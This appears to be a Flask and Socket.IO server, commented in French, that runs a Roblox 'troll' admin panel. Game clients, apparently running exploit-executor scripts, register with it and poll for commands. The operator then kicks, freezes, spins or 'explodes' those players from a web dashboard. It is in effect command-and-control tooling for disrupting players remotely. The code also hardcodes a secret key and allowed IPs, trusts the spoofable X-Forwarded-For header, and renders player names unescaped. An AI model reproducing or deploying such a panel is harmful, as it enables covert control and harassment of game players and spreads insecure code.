from flask import Flask, request, jsonify, render_template_string, abort
from flask_socketio import SocketIO
import time
import eventlet
from datetime import datetime

# Configuration d'Eventlet pour les WebSockets
eventlet.monkey_patch()

app = Flask(__name__)
app.config["SECRET_KEY"] = "dev_key_123"
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")

# --- CONFIGURATION ---
ALLOWED_IPS = {"37.66.149.36", "91.170.86.224"}

connected_players = {}
pending_commands = {}
history_logs = []

# --- LOGIQUE SERVEUR ---

def add_to_history(action, username, details=""):
    log = {
        "id": str(time.time()),
        "time": datetime.now().strftime("%H:%M:%S"),
        "user": username,
        "action": action,
        "details": details
    }
    history_logs.insert(0, log)
    if len(history_logs) > 100: history_logs.pop() # Limite à 100 entrées
    socketio.emit("update_history", history_logs)

def check_ip():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if ip and "," in ip:
        ip = ip.split(",")[0].strip()
    if ip not in ALLOWED_IPS:
        abort(403)

@app.errorhandler(403)
def access_denied(e):
    return """<body style="background:#000;color:red;text-align:center;padding-top:20%"><h1>ACCÈS REFUSÉ</h1></body>""", 403

# --- INTERFACE HTML ---

HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>ROBLOX ADMIN PANEL</title>
    <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&family=Inter:wght@400;700&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'Inter', sans-serif; background: #0a0a0a; color: #eee; }
        .container { max-width: 1400px; margin: auto; padding: 20px; }
        
        header { text-align: center; padding: 40px 0; border-bottom: 1px solid #222; margin-bottom: 30px; }
        h1 { font-family: 'Orbitron'; color: #00ffaa; text-shadow: 0 0 20px #00ffaa; letter-spacing: 2px; }

        .main-grid { display: grid; grid-template-columns: 1fr 380px; gap: 30px; }
        
        .section-title { font-size: 0.9rem; text-transform: uppercase; color: #00ffaa; margin-bottom: 20px; letter-spacing: 1px; display: flex; justify-content: space-between; align-items: center; }

        /* PLAYERS GRID */
        .players-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 20px; }
        .card { background: #151515; border: 1px solid #222; border-radius: 12px; padding: 20px; position: relative; transition: 0.3s; }
        .card:hover { border-color: #444; transform: translateY(-3px); }
        
        .trash-btn { position: absolute; top: 15px; right: 15px; background: none; border: none; color: #555; cursor: pointer; font-size: 1.2rem; transition: 0.2s; }
        .trash-btn:hover { color: #ff3366; }

        .status-dot { width: 10px; height: 10px; border-radius: 50%; display: inline-block; margin-right: 8px; }
        .online { background: #00ffaa; box-shadow: 0 0 10px #00ffaa; }
        .offline { background: #ff3366; }

        .player-name { font-size: 1.2rem; font-weight: bold; color: #ffcc00; margin-bottom: 15px; }
        .action-btns { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 15px; }
        .btn { padding: 8px; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; font-size: 0.75rem; color: white; transition: 0.2s; text-transform: uppercase; }
        .btn:hover { filter: brightness(1.2); }

        /* HISTORY */
        .history-box { background: #111; border: 1px solid #222; border-radius: 12px; padding: 20px; height: 700px; display: flex; flex-direction: column; }
        #history-list { flex-grow: 1; overflow-y: auto; font-size: 0.85rem; }
        .history-item { padding: 10px 0; border-bottom: 1px solid #222; display: flex; justify-content: space-between; align-items: center; }
        .hist-time { color: #555; margin-right: 8px; font-family: monospace; }
        .hist-user { color: #00ffaa; font-weight: bold; }
        .del-log { color: #444; cursor: pointer; margin-left: 10px; }
        .del-log:hover { color: #ff3366; }

        .clear-btn { background: none; border: 1px solid #333; color: #777; padding: 4px 10px; border-radius: 4px; cursor: pointer; font-size: 0.7rem; }
        .clear-btn:hover { background: #ff3366; color: white; border-color: #ff3366; }
    </style>
</head>
<body>

<div class="container">
    <header>
        <h1>ROBLOX CONTROL PANEL</h1>
    </header>

    <div class="main-grid">
        <div class="manage-section">
            <div class="section-title">
                <span>Manage Players</span>
            </div>
            <div class="players-grid" id="players-container"></div>
        </div>

        <div class="history-section">
            <div class="section-title">
                <span>History</span>
                <button class="clear-btn" onclick="clearHistory()">Clear History</button>
            </div>
            <div class="history-box">
                <div id="history-list"></div>
            </div>
        </div>
    </div>
</div>

<script>
    const socket = io();

    // Supprimer un joueur du panel
    function deletePlayer(uid) {
        fetch("/delete_player", {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({userid: uid})
        });
    }

    // Envoyer une commande
    function sendCmd(uid, cmd) {
        fetch("/troll", {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({userid: uid, cmd: cmd})
        });
    }

    // Historique
    function clearHistory() { fetch("/clear_history", {method: "POST"}); }
    function deleteLog(id) {
        fetch("/clear_history", {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({log_id: id})
        });
    }

    // Rendu des joueurs
    socket.on("update", (data) => {
        const container = document.getElementById("players-container");
        const currentIds = new Set(Object.keys(data.players));

        Object.entries(data.players).forEach(([id, p]) => {
            let card = document.getElementById(`card_${id}`);
            if (!card) {
                card = document.createElement("div");
                card.className = "card";
                card.id = `card_${id}`;
                container.appendChild(card);
            }
            card.innerHTML = `
                <button class="trash-btn" onclick="deletePlayer('${id}')">🗑️</button>
                <div class="player-name">
                    <span class="status-dot ${p.online ? 'online' : 'offline'}"></span>
                    ${p.username}
                </div>
                <div style="font-size:0.75rem; color:#666">
                    ID: ${id}<br>Executor: ${p.executor}
                </div>
                <div class="action-btns">
                    <button class="btn" style="background:#ff3366" onclick="sendCmd('${id}', 'kick')">Kick</button>
                    <button class="btn" style="background:#ff00ff" onclick="sendCmd('${id}', 'freeze')">Freeze</button>
                    <button class="btn" style="background:#00ffff; color:#000" onclick="sendCmd('${id}', 'spin')">Spin</button>
                    <button class="btn" style="background:#ffcc00; color:#000" onclick="sendCmd('${id}', 'explode')">Explode</button>
                    <button class="btn" style="background:#666" onclick="sendCmd('${id}', 'unfreeze')">Unfreeze</button>
                    <button class="btn" style="background:#666" onclick="sendCmd('${id}', 'unspin')">Unspin</button>
                </div>
            `;
        });

        // Supprimer les cartes des joueurs qui ne sont plus dans la liste
        document.querySelectorAll('.card').forEach(card => {
            if (!currentIds.has(card.id.replace('card_', ''))) card.remove();
        });
    });

    // Rendu de l'historique
    socket.on("update_history", (logs) => {
        const list = document.getElementById("history-list");
        list.innerHTML = logs.map(log => `
            <div class="history-item">
                <div>
                    <span class="hist-time">[${log.time}]</span>
                    <span class="hist-user">${log.user}</span>: ${log.action}
                </div>
                <span class="del-log" onclick="deleteLog('${log.id}')">✕</span>
            </div>
        `).join('');
    });
</script>
</body>
</html>
"""

# --- ROUTES ---

@app.route("/")
def index():
    check_ip()
    return render_template_string(HTML)

@app.route("/api", methods=["GET", "POST"])
def api():
    now = time.time()
    if request.method == "POST":
        data = request.get_json(silent=True) or {}
        uid = str(data.get("userid", ""))
        if data.get("action") == "register" and uid:
            if uid not in connected_players:
                add_to_history("Connexion", data.get("username", "Inconnu"))
            connected_players[uid] = {
                "username": data.get("username", "Unknown"),
                "executor": data.get("executor", "Unknown"),
                "last": now,
                "online": True
            }
        elif data.get("action") == "heartbeat" and uid in connected_players:
            connected_players[uid]["last"] = now
        return jsonify({"ok": True})

    if request.method == "GET":
        uid = str(request.args.get("userid", ""))
        if uid in pending_commands:
            cmd = pending_commands.pop(uid)
            return jsonify({"command": cmd})
        return jsonify({})

@app.route("/troll", methods=["POST"])
def troll():
    check_ip()
    data = request.get_json()
    uid, cmd = str(data["userid"]), data["cmd"]
    pending_commands[uid] = cmd
    name = connected_players.get(uid, {}).get("username", "Unknown")
    add_to_history(f"Commande: {cmd.upper()}", name)
    return jsonify({"sent": True})

@app.route("/delete_player", methods=["POST"])
def delete_player():
    check_ip()
    uid = str(request.get_json()["userid"])
    if uid in connected_players:
        name = connected_players[uid]["username"]
        del connected_players[uid]
        add_to_history("Retiré du panel", name)
    return jsonify({"ok": True})

@app.route("/clear_history", methods=["POST"])
def clear_history():
    check_ip()
    global history_logs
    data = request.get_json(silent=True)
    if data and "log_id" in data:
        history_logs = [l for l in history_logs if l["id"] != data["log_id"]]
    else:
        history_logs.clear()
    socketio.emit("update_history", history_logs)
    return jsonify({"ok": True})

# --- BOUCLE DE MISE À JOUR ---

def broadcast_loop():
    while True:
        now = time.time()
        to_remove = []
        for uid, p in connected_players.items():
            # Si pas de heartbeat depuis 30s -> Offline
            p["online"] = (now - p["last"] < 15)
            # Si pas de signe de vie depuis 2 mins -> Supprimer de la liste
            if now - p["last"] > 120: to_remove.append(uid)
            
        for uid in to_remove:
            name = connected_players[uid]["username"]
            del connected_players[uid]
            add_to_history("Déconnexion (Timeout)", name)

        socketio.emit("update", {"players": connected_players})
        socketio.sleep(2)

if __name__ == "__main__":
    socketio.start_background_task(broadcast_loop)
    socketio.run(app, host="0.0.0.0", port=5000)
